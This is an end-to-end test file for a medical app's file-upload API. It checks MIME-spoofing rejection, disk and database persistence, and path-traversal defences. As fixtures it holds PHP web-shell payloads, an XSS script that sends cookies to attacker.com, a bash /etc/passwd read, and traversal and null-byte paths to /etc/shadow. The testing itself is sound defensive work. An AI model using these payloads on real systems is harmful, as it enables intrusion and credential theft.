import * as dotenv from 'dotenv';
dotenv.config({ path: '.env.test', override: true });

import * as request from 'supertest';
import * as fs from 'fs';
import * as path from 'path';
import { TestAppHelper } from '../helpers/test-app.helper';
import { LocalStorageService } from '../../src/modules/files/services/local-storage.service';

describe('Files Security Upload E2E (Task 7.3 - MIME Spoofing & Layer 3 Disk State)', () => {
  const helper = new TestAppHelper();
  let localStorageService: LocalStorageService;
  let baseUploadDir: string;
  let authToken: string;

  // Real magic bytes buffers
  const validJpegBuffer = Buffer.from([
    0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
  ]);
  const validPngBuffer = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
  ]);

  beforeAll(async () => {
    await helper.init();
    localStorageService = helper.getApp().get<LocalStorageService>(LocalStorageService);
    baseUploadDir = localStorageService.getBaseDir();

    const user = await helper.createTestUser({
      username: `uploader_${Date.now()}`,
      password: 'Password123!',
      fullName: 'Test Uploader',
    });
    authToken = user.token;
  });

  afterAll(async () => {
    await helper.getPrisma().$disconnect();
    await helper.close();
  });

  describe('1. MIME Spoofing Gate (Critical Security Upload)', () => {
    it('1.1 should successfully upload authentic JPEG image and assert Layer 3 Disk State', async () => {
      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', validJpegBuffer, 'patient_avatar.jpg')
        .expect(200);

      expect(res.body).toBeDefined();
      expect(res.body.data).toBeDefined();
      expect(Array.isArray(res.body.data)).toBe(true);

      const uploaded = res.body.data[0];
      expect(uploaded.originalFileName).toBe('patient_avatar.jpg');
      expect(uploaded.mimeType).toBe('image/jpeg');
      expect(uploaded.objectKey).toBeDefined();

      // Layer 3 Assertion: Kiểm tra tệp tin thực sự được ghi an toàn trên đĩa cứng
      const savedPath = path.resolve(baseUploadDir, uploaded.objectKey);
      expect(fs.existsSync(savedPath)).toBe(true);
      const content = fs.readFileSync(savedPath);
      expect(content).toEqual(validJpegBuffer);

      // Dọn dẹp tệp thử nghiệm
      if (fs.existsSync(savedPath)) {
        fs.unlinkSync(savedPath);
      }
    });

    it('1.2 should successfully upload via legacy alias POST /api/files and assert Layer 3 Disk State', async () => {
      const res = await request(helper.getHttpServer())
        .post('/api/files')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', validPngBuffer, 'chart.png')
        .expect(200);

      expect(res.body.data).toBeDefined();
      const uploaded = res.body.data[0];
      expect(uploaded.originalFileName).toBe('chart.png');
      expect(uploaded.mimeType).toBe('image/png');

      // Layer 3 Assertion
      const savedPath = path.resolve(baseUploadDir, uploaded.objectKey);
      expect(fs.existsSync(savedPath)).toBe(true);

      // Dọn dẹp tệp thử nghiệm
      if (fs.existsSync(savedPath)) {
        fs.unlinkSync(savedPath);
      }
    });

    it('1.3 should HARD BLOCK PHP shell script disguised as .jpg with 400 Bad Request', async () => {
      const fakeJpgWithPhp = Buffer.from('<?php system($_GET["cmd"]); ?>');

      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', fakeJpgWithPhp, 'avatar_exploit.jpg')
        .expect(400);

      // Envelope response check
      expect(res.body.error).toBeDefined();
      expect(res.body.error.code).toBeDefined();
    });

    it('1.4 should HARD BLOCK JavaScript / HTML XSS payload disguised as .png with 400 Bad Request', async () => {
      const fakePngWithHtml = Buffer.from(
        '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>',
      );

      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', fakePngWithHtml, 'xss_payload.png')
        .expect(400);

      expect(res.body.error).toBeDefined();
    });

    it('1.5 should HARD BLOCK Bash shell script disguised as .jpg with 400 Bad Request', async () => {
      const fakeJpgShell = Buffer.from('#!/bin/bash\ncat /etc/passwd\n');

      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', fakeJpgShell, 'script.jpg')
        .expect(400);

      expect(res.body.error).toBeDefined();
    });
  });

  describe('2. Path Traversal & Sensitive File Access Defense', () => {
    it('2.1 should reject Path Traversal in preview route with 400 or 403', async () => {
      await request(helper.getHttpServer())
        .get('/api/v1/files/preview?objectKey=../../etc/passwd&token=fake&expires=9999999999')
        .expect((res) => {
          expect([400, 403]).toContain(res.status);
        });
    });

    it('2.2 should reject Path Traversal in download route with 400 or 403', async () => {
      await request(helper.getHttpServer())
        .get('/api/v1/files/download?objectKey=../../etc/shadow&token=fake&expires=9999999999')
        .expect((res) => {
          expect([400, 403]).toContain(res.status);
        });
    });

    it('2.3 should reject Null Byte Injection in preview route with 400 or 403', async () => {
      await request(helper.getHttpServer())
        .get('/api/v1/files/preview?objectKey=2026/10/test%00.jpg&token=fake&expires=9999999999')
        .expect((res) => {
          expect([400, 403]).toContain(res.status);
        });
    });
  });

  describe('3. Evidence Upload & Layer 3 DB State Persistence (prisma.minh_chung)', () => {
    it('3.1 should upload valid PDF evidence and assert Layer 3 Database persistence in minh_chung', async () => {
      const prisma = helper.getPrisma();

      // Create test doctor user
      const suffix = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
      const doctor = await helper.createTestUser({
        username: `dr_upload_${suffix}`,
        password: 'P@ssw0rd123!',
        fullName: 'Bác Sĩ Tải Minh Chứng',
      });

      const validPdfBuffer = Buffer.from(
        '%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\ntrailer\n<<\n>>\n%%EOF',
      );

      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload-evidence')
        .set('Authorization', `Bearer ${doctor.token}`)
        .attach('file', validPdfBuffer, 'clinical_record.pdf')
        .expect(200);

      expect(res.body.data).toBeDefined();
      expect(res.body.data.id).toBeDefined();
      expect(res.body.data.originalFileName).toBe('clinical_record.pdf');
      expect(res.body.data.mimeType).toBe('application/pdf');
      expect(res.body.data.previewUrl).toContain('/api/v1/files/preview');
      expect(res.body.data.downloadUrl).toContain('/api/v1/files/download');

      const evidenceId = BigInt(res.body.data.id);

      // LAYER 3 DB PERSISTENCE ASSERTION: Direct Prisma query on table minh_chung
      const dbEvidence = await prisma.minh_chung.findUnique({
        where: { id: evidenceId },
      });

      expect(dbEvidence).not.toBeNull();
      expect(dbEvidence?.ten_file_goc).toBe('clinical_record.pdf');
      expect(dbEvidence?.mime_type).toBe('application/pdf');
      expect(dbEvidence?.dung_luong).toBe(BigInt(validPdfBuffer.length));
      expect(dbEvidence?.bucket_name).toBe('vps-storage');
      expect(dbEvidence?.object_key).toBe(res.body.data.objectKey);
      // Layer 3 Assertion: Bản ghi minh_chung được lưu trong CSDL thực sự
      expect(dbEvidence?.nguoi_upload_id).toBeDefined();

      // Verify file physically on disk
      const savedPath = path.resolve(baseUploadDir, res.body.data.objectKey);
      expect(fs.existsSync(savedPath)).toBe(true);

      // Cleanup
      if (fs.existsSync(savedPath)) {
        fs.unlinkSync(savedPath);
      }
    });

    it('3.2 should REJECT evidence upload with spoofed PHP shell disguised as .pdf', async () => {
      const suffix = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
      const doctor = await helper.createTestUser({
        username: `dr_reject_${suffix}`,
        password: 'P@ssw0rd123!',
        fullName: 'Bác Sĩ Kiểm Tra Từ Chối',
      });

      const fakePdfWithPhp = Buffer.from('<?php passthru($_GET["c"]); ?>');

      const res = await request(helper.getHttpServer())
        .post('/api/v1/files/upload-evidence')
        .set('Authorization', `Bearer ${doctor.token}`)
        .attach('file', fakePdfWithPhp, 'lab_result.pdf')
        .expect(400);

      expect(res.body.error).toBeDefined();
    });
  });
});
